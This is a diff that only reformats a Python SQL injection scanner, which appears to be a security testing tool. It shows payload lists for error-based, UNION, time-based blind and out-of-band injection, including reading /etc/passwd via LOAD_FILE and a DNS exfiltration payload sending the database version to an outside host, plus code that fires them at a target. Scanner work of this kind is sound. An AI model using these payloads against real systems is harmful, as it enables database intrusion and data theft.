@@ -50,7 +50,10 @@ ERROR_PAYLOADS = [
     # PostgreSQL
     ("' AND 1=CAST((SELECT version()) AS int)--", "PG_CAST_ERROR"),
     # Oracle
-    ("' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--", "ORACLE_UTL"),
+    (
+        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
+        "ORACLE_UTL",
+    ),
     # SQLite
     ("' AND 1=1 UNION SELECT sql FROM sqlite_master--", "SQLITE_SCHEMA"),
 ]
@@ -62,7 +65,10 @@ UNION_PAYLOADS = [
     ("' UNION SELECT NULL,NULL,NULL--", "UNION_3COL"),
     ("' UNION SELECT NULL,NULL,NULL,NULL--", "UNION_4COL"),
     ("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "UNION_5COL"),
-    ("' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,version(),0x7e),NULL--", "UNION_VERSION"),
+    (
+        "' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,version(),0x7e),NULL--",
+        "UNION_VERSION",
+    ),
 ]
 
 # ──────────── TIME-BASED BLIND ────────────
@@ -70,7 +76,11 @@ TIME_PAYLOADS = [
     ("' OR SLEEP(4)--", "TIME_MYSQL", 3.5),
     ("'; WAITFOR DELAY '0:0:4'--", "TIME_MSSQL", 3.5),
     ("' OR pg_sleep(4)--", "TIME_POSTGRES", 3.5),
-    ("' || (SELECT CASE WHEN (1=1) THEN pg_sleep(4) ELSE pg_sleep(0) END)--", "TIME_PG_CASE", 3.5),
+    (
+        "' || (SELECT CASE WHEN (1=1) THEN pg_sleep(4) ELSE pg_sleep(0) END)--",
+        "TIME_PG_CASE",
+        3.5,
+    ),
     ("1; SELECT BENCHMARK(5000000,SHA1('test'))--", "BENCHMARK_MYSQL", 3.0),
     ("1' AND (SELECT * FROM (SELECT(SLEEP(4)))a)--", "SUBQUERY_SLEEP", 3.5),
 ]
@@ -111,7 +121,10 @@ STACKED_PAYLOADS = [
 # ──────────── OOB (Out-of-Band) ────────────
 OOB_PAYLOADS = [
     ("' UNION SELECT LOAD_FILE('/etc/passwd')--", "OOB_LOAD_FILE"),
-    ("' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.oob.cascavel.io\\\\a'))--", "OOB_DNS_EXFIL"),
+    (
+        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.oob.cascavel.io\\\\a'))--",
+        "OOB_DNS_EXFIL",
+    ),
 ]
 
 SQL_ERRORS = [
@@ -219,7 +232,9 @@ def _check_boolean_diff(r_true_len, r_false_len, r_baseline_len, param):
 
     # Condição: True é muito parecido com Baseline, e False é muito diferente
     # ou vice-versa, e a diferença entre eles é maior que a tolerância natural
-    if diff_true_false > tolerance and (diff_true_base <= tolerance or diff_false_base <= tolerance):
+    if diff_true_false > tolerance and (
+        diff_true_base <= tolerance or diff_false_base <= tolerance
+    ):
         return {
             "tipo": "SQLI_BLIND_BOOLEAN",
             "parametro": param,
@@ -233,7 +248,13 @@ def _check_boolean_diff(r_true_len, r_false_len, r_baseline_len, param):
 def _test_error_and_union(target, param, baseline_len):
     """Testa error-based e union-based em um parâmetro."""
     findings = []
-    all_payloads = ERROR_PAYLOADS + UNION_PAYLOADS + WAF_BYPASS_PAYLOADS + OOB_PAYLOADS + STACKED_PAYLOADS
+    all_payloads = (
+        ERROR_PAYLOADS
+        + UNION_PAYLOADS
+        + WAF_BYPASS_PAYLOADS
+        + OOB_PAYLOADS
+        + STACKED_PAYLOADS
+    )
     for payload, method in all_payloads:
         url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
         try:
@@ -260,7 +281,9 @@ def _test_time_based(target, param, baseline_latency):
             start = time.time()
             requests.get(url, timeout=12)
             elapsed = time.time() - start
-            vuln = _check_time_based(method, elapsed, threshold, param, baseline_latency)
+            vuln = _check_time_based(
+                method, elapsed, threshold, param, baseline_latency
+            )
             if vuln:
                 return vuln
         except requests.Timeout:
@@ -285,7 +308,9 @@ def _test_boolean_based(target, param):
         r_base = requests.get(f"http://{target}/?{param}=1", timeout=6)
         r_true = requests.get(f"http://{target}/?{param}=' AND 1=1--", timeout=6)
         r_false = requests.get(f"http://{target}/?{param}=' AND 1=2--", timeout=6)
-        return _check_boolean_diff(len(r_true.text), len(r_false.text), len(r_base.text), param)
+        return _check_boolean_diff(
+            len(r_true.text), len(r_false.text), len(r_base.text), param
+        )
     except Exception:
         return None
 
@@ -295,7 +320,10 @@ def _test_post_injection(target, param, baseline_len):
     for payload, method in ERROR_PAYLOADS[:5]:
         try:
             resp = requests.post(
-                f"http://{target}/", json={param: payload}, timeout=6, headers={"Content-Type": "application/json"}
+                f"http://{target}/",
+                json={param: payload},
+                timeout=6,
+                headers={"Content-Type": "application/json"},
             )
             vuln = _check_error_based(resp.text, f"POST_{method}", param, baseline_len)
             if vuln:
